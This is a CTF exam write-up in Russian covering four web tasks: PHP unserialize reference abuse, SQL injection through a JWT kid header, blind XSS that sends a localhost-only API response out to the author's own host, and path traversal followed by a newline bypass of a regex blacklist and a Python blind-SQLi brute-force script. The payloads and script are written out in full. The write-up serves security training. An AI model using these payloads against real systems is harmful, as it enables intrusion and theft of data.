## Exam WEB writeup

### 1. Найди сокровище

Попав на сайт, внимание привлекает кнопка `source`, по которой доступны исходники.

```
<?php
if (isset($_GET['source'])) {
    show_source('index.php');
    exit();
}
class Treasure {
    public $key;
    public $secret;
}

$show_secret = 0;

if (!empty($_POST['key']) && !is_array($_POST['key'])) {
    $treasure = @unserialize(base64_decode($_POST['key']));
    if ($treasure !== false) {
        $treasure->secret = getenv('FLAG');

        if ($treasure->key === $treasure->secret) {
            $show_secret = 1;
        }
    }
}
?>
```

Из исходников видно, что нам необходимо выставить $show_secret в значение 1.

Наш переданный ключ декодируется из base64, а после, с помощью функции unserialize формируется
объект класса Treasure. Для того, чтобы условие выполнилось, key и secret, прочитанный из окружения, должны совпадать.

Поискав в интернете методы php unserialize, на payload all the things найдем очень похожую ситуацию:

```
Vulnerable code:

<?php
class ObjectExample
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
Payload:

O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
```
Из документации PHP найдем, что такое R:

```
a:2:{i:0;s:3:"foo";i:1;R:2;}
The important part here is the R:2; element. It means “reference to the second value”. What is the second value? The whole array is the first value, the first index (s:3:"foo") is the second value, so that’s what is referenced.
```

Идея заключается в том, чтобы вместо передачи явного значения, ссылаться на другой параметр.

В поле secret, можно передать любое значение, так как оно перезапишется.
Попробуем передать следующую строку:

`O:8:"Treasure":2:{s:6:"secret";s:1:"a";s:3:"key";R:2;}`

Она же в base64:
`Tzo4OiJUcmVhc3VyZSI6Mjp7czo2OiJzZWNyZXQiO3M6MToiYSI7czozOiJrZXkiO1I6Mjt9`

Передадим наш ключ, и получим секрет
`deteact{04546f3944dd0c8ffe854ea5699cf2fd}`

### 2. BugBounty platform v3

Залогинившись на сайте, видим пост do not look, к которому у нас нет доступа, и который скорее всего надо прочитать.
На самом сайте нет никакого взаимодействия, а в cookie найдем jwt токен.

В его Header будет поле kid
```
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "3133773313-000000"
}
```
А в его Payload поле secure_check
```
{
  "username": "test",
  "secure_check": "888999000",
  "iat": 1682844691
}
```

Взломать его с помощью hashcat не получилось, но можно попробовать один из видов атаки:
SQLi в kid.

В jwt editor создадим новый ключ, а в поле "k" запишем последовательность, в base64 для дальнейшей инъекции.
`base64(MORS) = TU9SUw==`

```
{
    "kty": "oct",
    "kid": "2b3457a9-7fbb-493e-9bf2-6bf00d05c7cd",
    "k": "TU9SUw=="
}
```

Подменим kid, внедрив в него sqli, подпишем его, и сайт примет его как валидный. Необходимо следить за тем, чтобы длина
kid не превышала определенной границы, иначе получим ошибку `Kid is malformed!`.

![](assets/jwt_1.png)

Хоть теперь мы можем зайти под любым зарегестрированным пользователем, но вход под admin и t1oximin ничего не дает.
Остается понять, для чего применяется secure_check. Попробовав внедрить туда sql инъекцию это тоже сработало)

![](assets/jwt_2.png)

Мы узнали nickname настоящего админа.
Подставим его в username из токена, откроем пост Do not look, и получим, что репорт не найден.

Подствим обратиться к нему как к public report через /report/5 и получим флаг.

`deteact{afb5d77f8a5ab804c0c99b890539ef7a}`

### 3. Say Hello V2

Из проошлой версии таска можно вспомнить, что там была blind xss инъекция, которая отражалась у бота.
Пробуя разные возможные payload для xss сработал следующий - пришел запрос на сервер:

`<img src=x onerror=window.open("http://myip/")>">`

Осталось дело за малым, прочитать /api/secretsecretsecret........ найденный в коде сайта в скрипте `home.js`

```
// oh, really?
        // fetchApiKey() {
        //     return fetch('/api/secretsecretsecretsecretsecretsecretsecretsecretsecretsecretsecret')
        //         .then(res => res.json())
        // },
```

Этот api доступен только с локального хоста.
На этот раз в боте добавили ограничение на длину сообщения, и надо максимально экономить символы.

Составим js скрипт, как на семинаре, чтобы не прописывать secret столько раз, конкатенируем строки.
Получим:

```
<img src=x onerror="fetch('/api/'+'secret'.repeat(11)).then(r=>r.text()).then(d=>window.open('http://myip/?flag='+btoa(d)));">">
```

И загрузив сообщение в бота получим ответ:

```
79.143.25.24 - - [29/Apr/2023 16:53:05] "GET /?flag=eyJtZXNzYWdlIjoiZGV0ZWFjdHs5MmJlMDIxMTI1ZGJmYTE3MWMwNjk2YTIwZjBiODk2Mn0ifQ== HTTP/1.1" 200 -
```

Расшифруем и получим флаг:

`{"message":"deteact{92be021125dbfa171c0696a20f0b8962}"}`

P.S Это я 1 раз случайно сломал бота, перебирая разные xss. Не знаю почему, но после сообщения (или какого-то другого, могу попробовать снова сломать, если надо)) он переставал читать сообщения.
```
#'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
```

### 4. Dashboard

**Я не успел сделать этот таск на экзамене, немного не хватило, но решил добавить его сюда**

Изучая сайт нету ничего интересного, кроме jwt токена в сессии, в котором есть поле role, но сломать токен не получилось.
Атаки на алгоритм шифрования тоже ничего не дали. Определять валидность токена можно, отправляя запросы на **/login**, если происходит редирект, значит токен рабочий.

```
{
  "public_id": "a1d7dbd4-7a0c-4db7-9e10-904e90492b2d",
  "username": "test2",
  "role": "user",
  "exp": 1682852626
}
```

Так же на сайте есть директория static, сам сайт находится на сервере nginx, а подсказка с исходниками намекнула на path traversal.

Попробуем применить ее на разные файлы и сработало `http://45.131.97.54:1559/static../__init__.py`, полулось скачать файл.

В файле видим secret key для подписи jwt `app.config['SECRET_KEY'] = 'dont-forget-to-change-it-P5ydem2JfMpp'` и следующий файл, который можно посмотреть.  `from app import views`.

Скачиваем views.py `http://45.131.97.54:1559/static../views.py`

Видим, что при создании сайта был создан user admin, и в заметках содержится флаг

```
user = User()
        user.username = 'admin'
        user.password = generate_password_hash(
                getenv('PASSWORD'),
                method='sha256'
            )
        user.role = 'admin'
        user.public_id = str(uuid.uuid4())
        user.note = getenv('FLAG')
```

И видим api, которое доступно только для админов.

```
@app.route('/api/users')
@token_required
def users():
    user = decode_jwt(request.cookies['token'])
    result = {}
    status = 401

    if user['role'] == 'admin':
      ..........
  ```

Сгенерируем токен для админа, используя полученный секрет, и перейдем на /api/users

![](assets/jwt.png)

На /api/users видим список всех пользователей сайта, среди которых и админ, note которого надо прочитать.

`{"public_id":"13469944-1ffe-46e5-a3fb-e7ffd6fbab9a","role":"admin","username":"admin"}}`

Из кода для /api/users видно, что принимаются два параметра order и dir для сортировки пользователей,

при этом они без изменений вставляются в запрос к базе данных, если пройдут проверку на "опасность"

```
def is_dangerous(value):
    check = value.lower()
    pattern = re.compile(r".*(\")|(--)|(\')|(/\*)|(union)|(select)|(from)|(where)|(concat)|(case)|(substring).*")
    for v in check.split(' '):
        if re.match(pattern, v):
            return True
    return False
```

`users = User.query.order_by(text('%s %s' % (order, direction)))`

Получаем на бэке следующий запрос к бд, в который можно заинжектиться:

`SELECT * FROM USER ORDER BY {} {}`

По первой ссылке `re.match bypass` узнаем, что re проверяет только до первого перехода для новой строки, и мы можем использовать все заблокированные слова, просто перейдя на новую строку с помощью `\n`. И это не вызовет проблем, так как в базе данных запрос выполняется пока не встретит `;`.

составим следующий запрос, для получения note

```
SELECT * FROM USER ORDER BY (CASE WHEN (
SELECT (SUBSTRING(note,1,1))
FROM user
WHERE id=1)='d' THEN note ELSE id END)
```

В зависимости от того, по какому полю происходит сортировка можно определить успешность выполнения условия.
Напишем скрипт, который будет перебирать символы и получим флаг.

```
import requests
import string

header = {
    "Cookie": "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwdWJsaWNfaWQiOiIxMzQ2OTk0NC0xZmZlLTQ2ZTUtYTNmYi1lN2ZmZDZmYmFiOWEiLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxOTgyODUyNjI2fQ.HUdYVGpFbK-2p_mEi6Xc5sWVHcj_c-wgF_aHUj5ksac",
    "Authorization": "Basic ZGV0ZWFjdDE6eGhaTUlCOTV4UjN5"
}
possible_chars = list(string.ascii_letters)[:26] + list(string.digits) + ['{', '}']

flag = ''
for j in range(1, 42):
    for i in possible_chars:
        url1 = "http://45.131.97.54:1559/api/users?order=(case when (select (substring(note,{},1))" \
               "from user\n" \
               "where id=1)='{}' then note else id end)".format(
            j, i)
        r = requests.get(url1, headers=header)
        if r.json()['0']['username'] == 'admin':
            flag += i
            print(flag)
            break

```

`deteact{d873cd677b3a84687a694ebd7003889d}`
